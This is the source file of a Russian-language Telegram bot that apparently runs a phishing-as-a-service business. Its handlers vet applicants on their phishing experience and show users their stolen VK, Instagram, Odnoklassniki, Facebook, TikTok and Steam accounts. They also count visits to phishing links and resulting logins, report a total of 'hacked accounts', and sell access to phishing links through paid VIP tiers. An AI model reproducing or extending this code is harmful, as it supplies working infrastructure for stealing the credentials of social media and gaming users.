const bot = require('./createBot')
const adminCommands = require('./adminCommands')
const StringDate = require('./server/tools').GetStringDate
const ReplayList = require('./server/tools').CreateReplayList
const data = require('./database/models/userData')
const account = require('./database/models/account')
const link = require('./database/models/link')
const isAuth = require('./middleware/AuthCheck')


bot.onText(/\/start/, (msg) => {
    isAuth(msg)
})
bot.onText(/Подать заявку/,async (msg) => {
    if(isAuth){
      bot.sendMessage(msg.chat.id, '1. Был ли у тебя опыт в фишинге?', {
        reply_markup: {
          inline_keyboard: [
            [{
              text: "Да",
              callback_data: "experiance_true"
            }, {
              text: "Нет",
              callback_data: "experiance_false"
            }],
          ]
        }
    })}
})
bot.onText(/Написать админу/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Связаться с админом можно тут 👉🏻 ' + process.env.Admin)
})
bot.onText(/👤 Мой профиль/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        let visit = 0
        let authVist = 0
        let accountsToday = 0
        let accountsWeekend = 0
        let accountsAllTime = 0
        let admin = 'Пользователь'
        const accounts = await account.find({
            tg_id: msg.chat.id
        })
        if (user.vip) {
            admin = 'VIP Пользователь'
        }
        if (user.isAdmin) {
            admin = 'Администратор'
        }
        user.links_info.map(link => {
            visit++
            if (link.auth_visit) {
                authVist++
            }
        })
        bot.sendMessage(msg.chat.id, `👤 Мой профиль\n\n🆔 ID: <code>${msg.chat.id}</code>\n🎗 Статус: ${admin}\n\n💸 Баланс: ${user.balance}₽\n\n☘️ Аккаунтов за сегодня: 0\n☘️ Аккаунтов за неделю: 0\n☘️ Аккаунтов за месяц: 0\n☘️ Аккаунтов за всё время: 0\n\n👀 Переходов за всё время: ${visit}\n🔐 Переходов на авторизацию за всё время: ${authVist}`, {
            parse_mode: 'HTML'
        })
    }
})
bot.onText(/👥 Мои аккаунты/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, `👀Пожалуйста выберите тип аккаунтов`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Вконтакте',
                        callback_data: 'showAccs_vk'
                    }, {
                        text: 'Instagram',
                        callback_data: 'showAccs_inst'
                    }],
                    [{
                        text: 'Одноклассники',
                        callback_data: 'showAccs_ok'
                    }, {
                        text: 'Facebook',
                        callback_data: 'showAccs_fb'
                    }],
                    [{
                        text: 'TikTok',
                        callback_data: 'showAccs_tt'
                    }, {
                        text: 'Steam',
                        callback_data: 'showAccs_st'
                    }],
                    [{
                        text: '➡️',
                        callback_data: 'nextAccsReplay_3'
                    }]
                ]
            }
        })
    }
})
bot.onText(/🔗 Мои ссылки/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        if (user.vip) {
            bot.sendMessage(msg.chat.id, `Пожалуйста выберите категорию`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Вконтакте',
                            callback_data: 'showLinks_vk'
                        }, {
                            text: 'Instagram',
                            callback_data: 'showLinks_inst'
                        }],
                        [{
                            text: 'Одноклассники',
                            callback_data: 'showLinks_ok'
                        }, {
                            text: 'Facebook',
                            callback_data: 'showLinks_fb'
                        }],
                        [{
                            text: 'TikTok',
                            callback_data: 'showLinks_tt'
                        }, {
                            text: 'Steam',
                            callback_data: 'showLinks_st'
                        }],
                        [{
                            text: '➡️',
                            callback_data: 'nextLinksReplay_3'
                        }]
                    ]
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса.\nВы можете приобрести его пополнив баланс и нажав кнопку ниже`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    }
})
bot.onText(/📊 О боте/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, `📊 Статистика\n\nРегистраций в боте: <b>${(await data.find()).length}</b>\nПодписчиков в канале: <b>${await bot.getChatMemberCount('@ssniffer')}</b>\nВзломанных аккаунтов: <b>${(await account.find()).length}</b>\n\nМы работаем с 2021 года.`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'x',
                        callback_data: 'm'
                    }, undefined]
                ]
            },
            parse_mode: 'HTML'
        })
    }
})
bot.onText(/👑 VIP Статус/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        if (user.vip) {
            let vipType = ''
            if (user.vipType == '1') {
                vipType = 'Рабочий'
            }
            if (user.vipType == '2') {
                vipType = 'Любитель'
            }
            if (user.vipType == '3') {
                vipType = 'Профи'
            }
            if (user.vipType == '4') {
                vipType = 'Предприниматель'
            }
            bot.sendMessage(msg.chat.id, `У вас есть <b>VIP</b> статус [${vipType}].\nVIP закончится через ${StringDate(new Date(user.vipDate))}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Продлить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса.\nВы можете приобрести его пополнив баланс и нажав кнопку ниже`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    }
})
bot.onText(/👥 Наш чат/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, 'Вступить в чат можно по ссылке ниже \n' + process.env.Chat)
    }
})
bot.onText(/❓ Информация/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, `<b>❓ Информация</b>\n\n<b>♦️ Администратор</b> - ${process.env.Admin}  (По всем вопросам)\n\nОтветы на самые часто задаваемые вопросы написаты в статье\nhttps://teletype.in/@ssniffer/Nj73iy7Ps7z`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Правила',
                        url: 'https://t.me/joinchat/1yuUy9l4yYQ2N2My'
                    }]
                ]
            },
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    }
})
bot.onText(/⚡️ Новости/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, 'Канал с новостями \n' + process.env.Channel)
    }
})
bot.onText(/🎁 Получить бонус/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, `🎁 Получить бонус\n\nЧто даёт бонус?\n- При первом пополнении, (35₽ в Подарок🎁😻)\n\nДля того, чтобы получить бонус вы должны оставить положительный отзыв в нашей группе (https://t.me/ssniffero). Отзыв должен быть подкреплен скриншотом из своего профиля, чтобы отзыв не удалили.\nБонус работает только 1 раз, повторно его получить нельзя\n\n😻 Чтобы получить бонус на свой аккаунт - напишите Администратору (@vincicash_s).`,{
            reply_markup:{
                inline_keyboard: [
                    [{text: '📜 Оставить отзыв', url:'https://t.me/ssniffero'},{text: '🎁 Забрать бонус', url:'https://t.me/vincicash_s'}]
                ]
            },
            disable_web_page_preview: true
        })
    }
})
bot.onText(/💸 Пополнение/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, `💸 Пополнение баланса\n\nВаш актуальный баланс: ${user.balance} RUB\n\nМинимальная сумма пополнения — 100 рублей\n\n💚 Пополнение через QIWI\n💜 Пополнение через ЮMoney\n🧡 Пополнение через WebMoney\n\nНе нашли для себя удобного способа оплаты? Напишите нашему представителю по контактам ниже и мы что-нибудь придумаем для Вас\nПредставитель: @vincicash_s\n\nКакой  VIP статус лучше взять?\nhttps://teletype.in/@ssniffer/howbuy\n\nА так же если у вас есть сомнения по нашему боту можете посмотреть отзывы по кнопке ниже⤵️`,{
            reply_markup:{
                inline_keyboard:[
                    [{text:'💰Пополнить Баланс', url: 'https://t.me/VinciCash_S'}],
                    [{text:'🗂 История транзакций', callback_data: 'transactions'},{text:'🍀 Отзывы', url: 'https://t.me/ssniffero'}]
                ]
            },
            disable_web_page_preview: true
        })
    }
})
bot.onText(/👨‍👩‍👧‍👦 Мои рефералы/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, 'Канал с новостями \n' + process.env.Channel)
    }
})